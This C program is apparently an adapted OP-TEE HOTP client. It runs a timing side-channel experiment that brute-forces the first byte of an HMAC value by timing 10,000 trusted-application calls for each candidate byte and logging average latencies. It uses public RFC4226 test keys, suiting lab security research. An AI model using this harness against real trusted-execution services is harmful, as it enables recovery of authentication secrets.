/*
 * Copyright (c) 2017, Linaro Limited
 * All rights reserved.
 *
 * SPDX-License-Identifier: BSD-2-Clause
 */

#include <err.h>
#include <stdio.h>
#include <string.h>
#include <time.h>
#include <float.h>

/* OP-TEE TEE client API (built by optee_client) */
#include <tee_client_api.h>

/* For the UUID (found in the TA's h-file(s)) */
#include <hotp_ta.h>

struct test_value {
	size_t count;
	uint32_t expected;
};

/*
 * Test values coming from the RFC4226 specification.
 */
struct test_value rfc4226_test_values[] = {
	{ 0, 755224 },
	{ 1, 287082 },
	{ 2, 359152 },
	{ 3, 969429 },
	{ 4, 338314 },
	{ 5, 254676 },
	{ 6, 287922 },
	{ 7, 162583 },
	{ 8, 399871 },
	{ 9, 520489 }
};

void roll_avg(double *avg, double new_sample, uint32_t N)
{
	*avg -= *avg / N;
	*avg += new_sample / N;
}

int main(int argc, char *argv[])
{
	TEEC_Context ctx;
	TEEC_Operation op = { 0 };
	TEEC_Result res;
	TEEC_Session sess;
	TEEC_UUID uuid = TA_HOTP_UUID;

	uint32_t err_origin;
	struct timespec start, stop;
	double accum, min = DBL_MAX, max = 0, avg = 0;
	int min_pos = 0, max_pos = 0;
	int i = 0;
	FILE *fptr = NULL;

#if 0
	uint8_t correct[] = {
		0xcc, 0x93, 0xcf, 0x18,   0x50, 0x8d, 0x94, 0x93,
		0x4c, 0x64, 0xb6, 0x5d,   0x8b, 0xa7, 0x66, 0x7f,
		0xb7, 0xcd, 0xe4, 0xb0
	};
#endif
	uint8_t correct[] = {
		0xcc, 0x93, 0xcf, 0x18,   0x50, 0x8d, 0x94, 0x93,
		0x4c, 0x64, 0xb6, 0x5d,   0x8b, 0xa7, 0x66, 0x7f,
		0xb7, 0xcd, 0xe4, 0xb0
	};


	/*
	 * Shared key K ("12345678901234567890"), this is the key used in
	 * RFC4226 - Test Vectors.
	 */
	uint8_t K[] = {
		0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38,
		0x39, 0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36,
		0x37, 0x38, 0x39, 0x30
	};

	/* Initialize a context connecting us to the TEE */
	res = TEEC_InitializeContext(NULL, &ctx);
	if (res != TEEC_SUCCESS)
		errx(1, "TEEC_InitializeContext failed with code 0x%x", res);

	res = TEEC_OpenSession(&ctx, &sess, &uuid,
			       TEEC_LOGIN_PUBLIC, NULL, NULL, &err_origin);
	if (res != TEEC_SUCCESS)
		errx(1, "TEEC_Opensession failed with code 0x%x origin 0x%x",
		     res, err_origin);

	/* 1. Register the shared key */
	op.paramTypes = TEEC_PARAM_TYPES(TEEC_MEMREF_TEMP_INPUT,
					 TEEC_NONE, TEEC_NONE, TEEC_NONE);
	op.params[0].tmpref.buffer = K;
	op.params[0].tmpref.size = sizeof(K);

	fprintf(stdout, "Register the shared key: %s\n", K);
	res = TEEC_InvokeCommand(&sess, TA_HOTP_CMD_REGISTER_SHARED_KEY,
				 &op, &err_origin);
	if (res != TEEC_SUCCESS) {
		fprintf(stderr, "TEEC_InvokeCommand failed with code 0x%x "
			"origin 0x%x\n",
			res, err_origin);
		goto exit;
	}

	/* 2. Get HMAC based One Time Passwords */
	op.paramTypes = TEEC_PARAM_TYPES(TEEC_MEMREF_TEMP_INPUT, TEEC_NONE,
					 TEEC_NONE, TEEC_NONE);

	op.params[0].tmpref.buffer = correct;
	op.params[0].tmpref.size = sizeof(correct);
	fptr = fopen("/host/hmac_timing_attack_01.txt", "w");
	for (i = 0; i < 256; i++) {
		correct[0] = i;
		for (int k = 0; k < 10000; k++) {
			clock_gettime( CLOCK_REALTIME, &start);
			res = TEEC_InvokeCommand(&sess, TA_HOTP_CMD_GET_HOTP, &op,
						 &err_origin);
			clock_gettime( CLOCK_REALTIME, &stop);
			accum = ( stop.tv_sec - start.tv_sec ) + ( stop.tv_nsec - start.tv_nsec );
			if (accum < 500000 || accum > 10000000)
				continue;

			if (accum < min) {
				min = accum;
				min_pos = k;
			}

			if (accum > max) {
				max = accum;
				max_pos = k;
			}

			roll_avg(&avg, accum, 500);

			// fprintf(stdout, "cur: %lf, min: %lf, max: %lf, avg: %lf\n", accum, min, max, avg);
#if 0
			if (res != TEEC_SUCCESS) {
				fprintf(stderr, "TEEC_InvokeCommand failed with code "
					"0x%x origin 0x%x\n", res, err_origin);
				goto exit;
			}
#endif
		}
		//fprintf(stdout, "i: %d --> cur: %lf, min[%d]: ---, max[%d] ---, avg: %lf\n", i, accum, min_pos, max_pos, avg);
		//fprintf(stdout, "%d; %x; %lf\n", i, i, avg);
		fprintf(stdout, "%d; %x; %lf\n", i, i, avg);
		fprintf(fptr, "%d; %x; %lf\n", i, i, avg);
		avg = 0;
	}
exit:
	TEEC_CloseSession(&sess);
	TEEC_FinalizeContext(&ctx);
	fclose(fptr);

	return 0;
}
